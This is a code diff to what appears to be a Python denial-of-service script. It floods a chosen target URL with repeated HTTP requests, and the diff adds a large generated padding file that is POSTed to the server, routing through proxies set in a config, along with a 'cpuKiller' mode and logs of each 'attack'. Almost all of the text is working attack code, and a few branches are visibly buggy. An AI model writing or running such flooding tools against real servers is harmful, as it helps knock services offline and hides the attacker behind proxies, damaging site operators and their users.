@@ -16,6 +16,7 @@ parser = argparse.ArgumentParser()
 parser.add_argument("-t", "--target", dest="targete", default="https://google.com", help="set target default is "
                                                                                          "https://google.com")
 parser.add_argument("-a", "--attacks", dest="attacks", default="1", help="the amount of attacks")
+parser.add_argument("-d", "--data", dest="data", default="200", help="the data you will send to the server (in mb)")
 parser.add_argument("-m", "--multi", dest="multi", default="1", help="run a attacks multiple times")
 args = parser.parse_args()
 yesses = ["yes", "yEs", "yeS", "Yes", "YES", "\n", "y", "Y", ""]
@@ -24,11 +25,20 @@ nower = date.today()
 nowere = str(nower.strftime("%h:%m:%s"))
 
 cfg = open("./config.json")
-target = str(args.targete.replace("https://", "") and args.targete.replace("http://", ""))
+targetr = str(args.targete.replace("https://", ""))
+target = targetr = str(targetr.replace("http://", ""))
 cfgR = json.load(cfg)
+
+global BFile
+
+prox = {
+    "http": str(cfgR["httpProxy"]) + ":" + str(cfgR["httpPort"]),
+    "https": str(cfgR["httpsProxy"]) + ":" + str(cfgR["httpsPort"])
+}
 
 
 def startup():
+    generateByteFile()
     if path.exists("./attacks"):
         theFile = open(f"./attacks/{target}.txt", "w+")
         theFile.writelines(f"CREATED FILE\n")
@@ -39,6 +49,10 @@ def startup():
         theFile.writelines(f"CREATED FILE\n")
         cli()
 
+def generateByteFile():
+    BFile = open('byteFile', 'wb')
+    BFile.seek((int(args.data) * int(args.data) * int(args.data))-1)
+    BFile.write(bytes('\0', encoding='utf8'))
 
 def cli():
     global un
@@ -84,7 +98,12 @@ def runHttpAttack():
             adapter = HTTPAdapter(max_retries=retry)
             session.mount('http://', adapter)
             session.mount('https://', adapter)
-            session.get(args.targete)
+            aF = open("byteFile")
+            if cfgR["useProxy"]:
+                session.post(args.targete, proxies=prox, data=aF)
+                session.get(args.targete, proxies=prox)
+            elif cfgR["useProxy"]:
+                session.post(args.targete)
             time.sleep(float(cfgR["delay"]))
         print(f"stack of {args.attacks} completed")
     elif cfgR["cpuKiller"]:
@@ -103,8 +122,11 @@ def cpuKiller(x):
     adapter = HTTPAdapter(max_retries=retry)
     session.mount('http://', adapter)
     session.mount('https://', adapter)
-    session.get(args.targete)
-    # r = requests.get(url=args.targete)
+    aF = open("byteFile")
+    if cfgR["useProxy"]:
+        session.post(url=args.targete, data=aF, proxies=prox)
+    elif not cfgR["useProxy"]:
+        session.post(url=args.targete, data=aF)
     theFiler2 = open(f"./attacks/{target}.txt", "a+")
     theFiler2.writelines(f"[{nowere}] => Attack number {x} successfully\n")
     theFiler2.writelines(f"[{nowere}] => {x} attacks completed\n")
@@ -118,3 +140,4 @@ def expection(msg, ext):
 
 
 startup()
+
